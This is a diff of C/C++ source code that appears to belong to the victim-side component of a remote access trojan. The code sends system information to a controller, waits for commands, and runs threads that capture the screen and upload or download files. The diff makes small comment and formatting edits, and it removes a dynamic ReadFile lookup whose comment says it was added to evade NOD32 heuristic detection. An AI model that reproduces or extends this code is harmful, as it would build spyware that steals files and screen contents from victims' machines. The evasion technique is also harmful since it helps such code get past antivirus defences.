@@ -23,7 +23,7 @@
 struct MODIFY_DATA
 {
 	char  strIPFile[128];   //ip文件or DNS						0
-	char  strVersion[16];   //服务端版本						128
+	char  strVersion[16];   //服务端版本							128
 	DWORD dwVipID;          //VIP ID							144
 	BOOL  bReplace;         //TRUE-替换服务，FALSE-新建服务		148
 	char  strSvrName[32];   //服务名称							149
@@ -128,7 +128,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 	msgHead.dwCmd = SOCKET_CONNECT;
 	msgHead.dwSize = sizeof(SysInfo);
 
-	memcpy(chBuffer, &m_SysInfo, sizeof(SysInfo));//填充被控端信息
+	memcpy(chBuffer, &m_SysInfo, sizeof(SysInfo));
 
 	if ( !SendMsg(MainSocket, (char *)&m_SysInfo, &msgHead) )
 	{
@@ -137,9 +137,9 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 		return 1; //send socket type error
 	}
 
-	while (1)	//接收命令
+	while (1)
 	{
-		if ( !RecvMsg(MainSocket, (char *)chBuffer, &msgHead) )	//掉线，错误
+		if ( !RecvMsg(MainSocket, (char *)chBuffer, &msgHead) )
 		{
 			MsgErr("Can't Recv");
 			shutdown(MainSocket, 0x02);
@@ -161,7 +161,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 			case CMD_SCREENSTART:
 			{
 #ifdef LxScreem
-				DWORD dwSock = msgHead.dwExtend1;	//获取上线的socket==DWORD
+				DWORD dwSock = msgHead.dwExtend1;	//获取上线的socket == DWORD
 				CreateThread(NULL, NULL, ScreenThread, (LPVOID)dwSock, NULL, NULL);
 #endif
 			}
@@ -189,7 +189,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 			}
 			break;
 
-			case CMD_HEARTBEAT:	//心跳包
+			case CMD_HEARTBEAT:
 			{
 				//不处理这里，可以做计数，因为控制端基本也是定时发的
 			}
@@ -446,7 +446,6 @@ DWORD _stdcall FileManageThread(LPVOID lParam)
 		break;
 		}
 
-		//发送数据
 		if (!SendMsg(FileSocket, chBuffer, &msgHead))
 			break;
 	}
@@ -456,6 +455,7 @@ DWORD _stdcall FileManageThread(LPVOID lParam)
 
 	shutdown(FileSocket, 0);
 	closesocket(FileSocket);
+
 	return 0;
 }
 
@@ -481,7 +481,7 @@ DWORD _stdcall ScreenThread(LPVOID lParam)
 
 	MsgHead msgHead;
 	int nColor = 8;
-	//send socket type
+
 	msgHead.dwCmd = SOCKET_SCREEN;
 	msgHead.dwSize = 0;
 	msgHead.dwExtend1 = dwSock;
@@ -790,8 +790,8 @@ DWORD _stdcall FileDownThread(LPVOID lParam)
 
 	//get download data
 	hDownFile = CreateFile(m_FileOpt.cScrFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
-	if (hDownFile == INVALID_HANDLE_VALUE)//CMD_READFILEEOR
-		dwDownFileSize  = 0;
+	if (hDownFile == INVALID_HANDLE_VALUE)
+		dwDownFileSize  = 0; //CMD_READFILEEOR
 	else
 		dwDownFileSize = GetFileSize(hDownFile, NULL);
 
@@ -803,42 +803,19 @@ DWORD _stdcall FileDownThread(LPVOID lParam)
 		closesocket(FileSocket);
 		return 1;//send socket type error
 	}
-	//被NOD32启发杀了
-	HINSTANCE hInst = LoadLibraryW(L"kernel32.dll");
-	if (hInst == NULL)
-	{
-		closesocket(FileSocket);
-		return 0;//send socket type error
-	}
-	typedef BOOL (WINAPI *pReadFile)(
-		HANDLE hFile,
-		LPVOID lpBuffer,
-		DWORD nNumberOfBytesToRead,
-		LPDWORD lpNumberOfBytesRead,
-		LPOVERLAPPED lpOverlapped
-	);
-	pReadFile MyReadFile = (pReadFile)GetProcAddress(hInst, "ReadFileA");
 
-	//循环发送文件数据
 	while (dwDownFileSize > 0)
 	{
-		if (MyReadFile)
-		{
-			if ( !MyReadFile(hDownFile, SendBuffer, 4096, &dwBytes, NULL) )
-				break;
-		}
-		else if ( !ReadFile(hDownFile, SendBuffer, 4096, &dwBytes, NULL) )
+		if (!ReadFile(hDownFile, SendBuffer, 4096, &dwBytes, NULL))
 		{
 			break;
 		}
 
 		if ( send(FileSocket, (char*)&SendBuffer, dwBytes, 0) <= 0 )
 			break;
-		dwDownFileSize -= dwBytes;
 
+		dwDownFileSize -= dwBytes;
 	}
-	if (hInst)
-		FreeLibrary(hInst);
 
 	CloseHandle(hDownFile);
 	shutdown(FileSocket, 0x02);
@@ -862,7 +839,6 @@ DWORD _stdcall FileUpThread(LPVOID lParam)
 	setsockopt(FileSocket, SOL_SOCKET, SO_RCVTIMEO, (char*)&iOutTime, sizeof(int));
 
 	MsgHead msgHead;
-	//send socket type
 	msgHead.dwCmd = SOCKET_FILEUP;
 	msgHead.dwSize = 0;
 	if (!SendMsg(FileSocket, NULL, &msgHead))
